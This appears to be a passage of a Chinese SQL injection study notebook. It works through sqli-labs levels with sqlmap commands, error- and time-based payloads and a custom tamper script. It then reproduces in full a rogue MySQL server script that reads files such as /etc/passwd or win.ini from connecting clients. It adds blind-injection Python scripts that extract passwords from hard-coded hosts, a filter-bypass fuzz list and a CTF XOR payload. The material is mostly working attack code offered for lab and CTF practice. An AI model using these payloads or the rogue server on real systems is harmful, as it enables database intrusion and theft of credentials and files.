    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: id=1' AND EXTRACTVALUE(2208,CONCAT(0x5c,0x7176787671,(SELECT (ELT(2208=2208,1))),0x716b627671)) AND 'TFVC'='TFVC

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 3398 FROM (SELECT(SLEEP(5)))PPqA) AND 'xghV'='xghV
---

```





### less25a

payload与上一关一致，但是也无法获取数据库数量：[08:50:10] [ERROR] unable to retrieve the number of databases


```sh
sqlmap -u http://192.168.133.162/sql/Less-25a/index.php?id=1  --dbs --thread 5 --batch --tamper "symboliclogical.py" -D "security" --tables
```

```sh
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 6237=6237

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 6319 FROM (SELECT(SLEEP(5)))wIaO)
---

```





### less26

这一关主要考察过滤空格的绕过，有些特殊字符在windows下apache无法解析。
- %09 TAB 键（水平） 
- %0a 新建一行 
- %0c 新的一页 
- %0d return 功能 
- %0b TAB 键（垂直） 
- %a0 空格
- /**/
- ()

这一关结合了25，将空格，or，and,/*,#,--,/等各种符号过滤

直接跑无法成功，加上tamper  space2comment.py 可以把' ' 编程 '/**/' ，也可以使用space2mysqlblank.py，但是后者无法检测出漏洞。此处为我的环境原因，可能无法解析如上的一些特殊字符



```sh
sqlmap -u http://192.168.133.162/sql/Less-26/index.php?id=1  --current-db --thread 5 --tamper "space2comment.py;symboliclogical.py" --batch --technique E -v 3
```



```sh
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 1562 HTTP(s) requests:
---
Parameter: id (GET)
    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: id=1' AND EXTRACTVALUE(5063,CONCAT(0x5c,0x716b7a7671,(SELECT (ELT(5063=5063,1))),0x71767a6a71)) AND 'PxYC'='PxYC

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
    Payload: id=1' AND SLEEP(5) AND 'mExo'='mExo
---
```



尽管获得了注入点和方式，但是却无法获取到数据库，估计与tamper的处理有所关系。

使用 -v 3 参数获取发送的payload

```sh
1'/**/%26%26/**/EXTRACTVALUE(9494,CONCAT(0x5c,0x716b7a7671,(SELECT/**/REPEAT(0x38,8)),0x71767a6a71))/**/%26%26/**/'DeJl'='DeJl
```



可以看出sqlmap在处理空格替换的时候没有处理好最后一个单引号，连接起来后可能因为mysql版本问题或者是字符解析问题，有些字符无法奏效。看来上面成功检测漏洞实际上是假象，使用上面的payload并不能奏效。



尝试自己写tamper，将其修改



先手工测试一下报错注入：

`id=2'<>(select(updatexml(1,concat(0x2b,version(),0x2b),1)))<>'1`

接下来就是在sqlmap中添加前后缀，



```sh
sqlmap -u http://192.168.133.162/sql/Less-26/index.php?id=1  --dbs --thread 5 --tamper "symboliclogical.py;space2comment.py" --prefix "2'<>(" --suffix ")<>'1"  --batch -v 3 --technique E
```

但是无法奏效，查阅资料后发现是/**/只对特定的mysql版本有效（难怪报错的时候给我报个连着的select和version）



查看了一下sqlmap对updatexml的支持：

```sh
2'<>((UPDATEXML(1474,CONCAT(0x2e,0x7176786a71,(SELECT/**/REPEAT(0x34,64)),0x7170767171),5807)))<>'1
```

中间换成(SELECT(REPEAT(0x34,64)))就可以成功回显了。



这个时候使用sqlmap其实作用已经不大了，毕竟工具是死的，手工编写一些脚本可能更加有效。



想要修改的话可以修改源码，参考上面的sqlmap自定义去添加自定义payload比较好

由于空格过滤后别的字符又无法解析，所以这里将空格过滤注释掉后可以成功注入





### less26

```sh
 sqlmap -u http://192.168.133.162/sql/Less-26a/index.php?id=1  --dbs --thread 5 --tamper "symboliclogical.py" --prefix "')<>(" --suffix ")<>('1"  --batch -v 3  --tables -D "security" --level 3
```



```sh
---
Parameter: id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace
    Payload: id=')<>((CASE WHEN (1221=1221) THEN SLEEP(5) ELSE 1221 END))<>('1
    Vector: (CASE WHEN ([INFERENCE]) THEN SLEEP([SLEEPTIME]) ELSE [RANDNUM] END)
---

```

能够成功检测出注入，但是ord因为有or所以被过滤掉了

如果将ord换成ascii即可绕过

编写tamper

```python
#!/usr/bin/env python
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.LOW

def tamper(payload, **kwargs):
    if payload:
        bypass_str = "ascii"
        payload=payload.replace("ORD",bypass_str)
    return payload
```





### less27











# [SQLNuke——mysql 注入load_file Fuzz工具](https://tanjiti.lofter.com/post/1cc6c85b_10c57740)











---------



**以下直接参考**

- Payloads All The Things

# MSSQL Injection



# Oracle SQL Injection



# PostgreSQL injection



# Hibernate Query Language Injection 



# SQLite Injection



----------------









# Mysql 任意文件读取漏洞

- https://paper.seebug.org/1112/
- https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue_mysql_server.py

```python
#!/usr/bin/env python
#coding: utf8

import socket
import asyncore
import asynchat
import struct
import random
import logging
import logging.handlers

PORT = 3306
log = logging.getLogger(__name__)
log.setLevel(logging.DEBUG)
tmp_format = logging.handlers.WatchedFileHandler('mysql.log', 'ab')
tmp_format.setFormatter(logging.Formatter("%(asctime)s:%(levelname)s:%(message)s"))
log.addHandler(
    tmp_format
)

filelist = (
#    r'c:boot.ini',
    r'c:windowswin.ini',
#    r'c:windowssystem32driversetchosts',
#    '/etc/passwd',
#    '/etc/shadow',
)

#================================================
#=======No need to change after this lines=======
#================================================

__author__ = 'Gifts'

def daemonize():
    import os, warnings
    if os.name != 'posix':
        warnings.warn('Cant create daemon on non-posix system')
        return

    if os.fork(): os._exit(0)
    os.setsid()
    if os.fork(): os._exit(0)
    os.umask(0o022)
    null=os.open('/dev/null', os.O_RDWR)
    for i in xrange(3):
        try:
            os.dup2(null, i)
        except OSError as e:
            if e.errno != 9: raise
    os.close(null)

class LastPacket(Exception):
    pass

class OutOfOrder(Exception):
    pass

class mysql_packet(object):
    packet_header = struct.Struct('<Hbb')
    packet_header_long = struct.Struct('<Hbbb')
    def __init__(self, packet_type, payload):
        if isinstance(packet_type, mysql_packet):
            self.packet_num = packet_type.packet_num + 1
        else:
            self.packet_num = packet_type
        self.payload = payload

    def __str__(self):
        payload_len = len(self.payload)
        if payload_len < 65536:
            header = mysql_packet.packet_header.pack(payload_len, 0, self.packet_num)
        else:
            header = mysql_packet.packet_header.pack(payload_len & 0xFFFF, payload_len >> 16, 0, self.packet_num)

        result = "{0}{1}".format(
            header,
            self.payload
        )
        return result

    def __repr__(self):
        return repr(str(self))

    @staticmethod
    def parse(raw_data):
        packet_num = ord(raw_data[0])
        payload = raw_data[1:]

        return mysql_packet(packet_num, payload)

class http_request_handler(asynchat.async_chat):

    def __init__(self, addr):
        asynchat.async_chat.__init__(self, sock=addr[0])
        self.addr = addr[1]
        self.ibuffer = []
        self.set_terminator(3)
        self.state = 'LEN'
        self.sub_state = 'Auth'
        self.logined = False
        self.push(
            mysql_packet(
                0,
                "".join((
                    'x0a',  # Protocol
                    '3.0.0-Evil_Mysql_Server' + '',  # Version
                    #'5.1.66-0+squeeze1' + '',
                    'x36x00x00x00',  # Thread ID
                    'evilsalt' + '',  # Salt
                    'xdfxf7',  # Capabilities
                    'x08',  # Collation
                    'x02x00',  # Server Status
                    '' * 13,  # Unknown
                    'evil2222' + '',
                ))
            )
        )

        self.order = 1
        self.states = ['LOGIN', 'CAPS', 'ANY']

    def push(self, data):
        log.debug('Pushed: %r', data)
        data = str(data)
        asynchat.async_chat.push(self, data)

    def collect_incoming_data(self, data):
        log.debug('Data recved: %r', data)
        self.ibuffer.append(data)

    def found_terminator(self):
        data = "".join(self.ibuffer)
        self.ibuffer = []

        if self.state == 'LEN':
            len_bytes = ord(data[0]) + 256*ord(data[1]) + 65536*ord(data[2]) + 1
            if len_bytes < 65536:
                self.set_terminator(len_bytes)
                self.state = 'Data'
            else:
                self.state = 'MoreLength'
        elif self.state == 'MoreLength':
            if data[0] != '':
                self.push(None)
                self.close_when_done()
            else:
                self.state = 'Data'
        elif self.state == 'Data':
            packet = mysql_packet.parse(data)
            try:
                if self.order != packet.packet_num:
                    raise OutOfOrder()
                else:
                    # Fix ?
                    self.order = packet.packet_num + 2
                if packet.packet_num == 0:
                    if packet.payload[0] == 'x03':
                        log.info('Query')

                        filename = random.choice(filelist)
                        PACKET = mysql_packet(
                            packet,
                            'xFB{0}'.format(filename)
                        )
                        self.set_terminator(3)
                        self.state = 'LEN'
                        self.sub_state = 'File'
                        self.push(PACKET)
                    elif packet.payload[0] == 'x1b':
                        log.info('SelectDB')
                        self.push(mysql_packet(
                            packet,
                            'xfex00x00x02x00'
                        ))
                        raise LastPacket()
                    elif packet.payload[0] in 'x02':
                        self.push(mysql_packet(
                            packet, 'x02'
                        ))
                        raise LastPacket()
                    elif packet.payload == 'x00x01':
                        self.push(None)
                        self.close_when_done()
                    else:
                        raise ValueError()
                else:
                    if self.sub_state == 'File':
                        log.info('-- result')
                        log.info('Result: %r', data)

                        if len(data) == 1:
                            self.push(
                                mysql_packet(packet, 'x02')
                            )
                            raise LastPacket()
                        else:
                            self.set_terminator(3)
                            self.state = 'LEN'
                            self.order = packet.packet_num + 1

                    elif self.sub_state == 'Auth':
                        self.push(mysql_packet(
                            packet, 'x02'
                        ))
                        raise LastPacket()
                    else:
                        log.info('-- else')
                        raise ValueError('Unknown packet')
            except LastPacket:
                log.info('Last packet')
                self.state = 'LEN'
                self.sub_state = None
                self.order = 0
                self.set_terminator(3)
            except OutOfOrder:
                log.warning('Out of order')
                self.push(None)
                self.close_when_done()
        else:
            log.error('Unknown state')
            self.push('None')
            self.close_when_done()

class mysql_listener(asyncore.dispatcher):
    def __init__(self, sock=None):
        asyncore.dispatcher.__init__(self, sock)

        if not sock:
            self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
            self.set_reuse_addr()
            try:
                self.bind(('', PORT))
            except socket.error:
                exit()

            self.listen(5)

    def handle_accept(self):
        pair = self.accept()

        if pair is not None:
            log.info('Conn from: %r', pair[1])
            tmp = http_request_handler(pair)

z = mysql_listener()
daemonize()
asyncore.loop()
```







# Mysql UDF 后门

- [Mysql UDF BackDoor](https://xz.aliyun.com/t/2365#toc-10)



# burp macros和sqlmap绕过csrf防护进行sql注入

- [使用burp macros和sqlmap绕过csrf防护进行sql注入](https://www.anquanke.com/post/id/85593)



# Mysql弱口令

## 暴力破解程序

- 工具：hydra
- CPP

用链表实现的MYSQL、MSSQL和oracle密码暴破C程序

http://blog.51cto.com/foxhack/35604

- Python

https://github.com/chinasun021/pwd_crack/blob/master/mysql/mysql_crack.py

https://www.waitalone.cn/python-mysql-mult.html

- Go

https://github.com/netxfly/x-crack







# SQL注入fuzz







# CTF题





## 常用脚本

tiimebased

```python
# coding:utf-8
# Author:LSA
# Description:Time based sqli script for sqli-labs less 6
# Data:20180108


import requests
import time
import string
import sys

headers = {"user-agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)"}

# chars = 'abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.'

result = ''

global length

for i in range(1, 50):

    for char in range(20,128):

        url = 'http://222.186.175.249:10080/pikachu/vul/sqli/sqli_blind_t.php?name=vince%27+and+if%28ascii%28substr%28%28select+concat%28username%2C0x2b%2Cpassword%29+from+users+limit+1%29%2C{}%2C1%29%29%3E{}%2C1%2Csleep%283%29%29%23&submit=%E6%9F%A5%E8%AF%A2'
        urlformat = url.format(i, char)
        print('[+] url:',urlformat)
        start_time = time.time()

        rsp = requests.get(urlformat, headers=headers)

        if time.time() - start_time > 3:
            result += chr(char)
            print('result: ', result)
            break
        else:
            pass

print('database is ' + result)
```





二分

```python
import requests
import urllib

url = 'http://web.jarvisoj.com:32787/login.php'
target = ''
for i in range(100):
    print("***************************************{}******************************************".format(str(i+1)))
    Max = 128
    Min = 20
    while(Max!=Min):
        Mid = (Max+Min)//2
        # print("Max", Max, ",Min", Min, "Mid", Mid)

        data = {
            'username':"'||if((ascii(substr((select/**/password/**/from/**/admin),{},1))>{}),1,0)#".format(i+1,Mid),
            'password':"123"
        }
        # print(data['username'])

        r = requests.post(url,data=data)
        # print(r.text)
        if '密码错误' in r.text:
            # print('密码错误')
            Min = Mid
        else:
            Max = Mid
        if(Max==Min+1):
            break
    target+=chr(Max)
    print(target)

print("ok:",target)
```



## 字符和关键字fuzz

```sql
length 
+
handler
like
select 
sleep
database
delete
having
or
as
-~
BENCHMARK
limit
left
select
insert
right
#
--+
INFORMATION
--
;
!
%
+
xor
<>
(
>
<
)
.
^
=
AND
BY
CAST
COLUMN
COUNT
CREATE
END
case
'1'='1
when
admin'
"
length 
+
length
REVERSE

ascii
select 
database
left
right
union
"
&
&&
||
oorr
/
//
//*
*/*
/**/
anandd
GROUP
HAVING
IF
INTO
JOIN
LEAVE
LEFT
LEVEL
sleep
LIKE
NAMES
NEXT
NULL
OF
ON
|
infromation_schema
user
OR
ORDER
ORD
SCHEMA
SELECT
SET
TABLE
THEN
UNION
UPDATE
USER
USING
VALUE
VALUES
WHEN
WHERE
ADD
AND
prepare
set
update
delete
drop
inset
CAST
COLUMN
CONCAT
GROUP_CONCAT
group_concat
CREATE
DATABASE
DATABASES
alter
DELETE
DROP
floor
rand()
information_schema.tables
TABLE_SCHEMA
%df
concat_ws()
concat
LIMIT
ORD
ON
extractvalue
order 
CAST()
by
ORDER
OUTFILE
RENAME
REPLACE
SCHEMA
SELECT
SET
updatexml
SHOW
SQL
TABLE
THEN
TRUE
instr
benchmark
format
bin
substring
ord

UPDATE
VALUES
VARCHAR
VERSION
WHEN
WHERE
/*
`
  
,
users
%0a
%0b
mid
for
BEFORE
REGEXP
RLIKE
in
sys schemma
SEPARATOR
XOR
CURSOR
FLOOR
sys.schema_table_statistics_with_buffer
INFILE
count
%0c
from
%0d
%a0
=
@
else
```



## 异或盲注：skctf login3

题目链接：http://123.206.31.85:49167/



payload：

=，空格、and、or都被过滤了，但是>、<、^没有被过滤

```
username = admin'^(ascii(mid((password)from(1)))>1)^('2'>'1')%23
```





# realword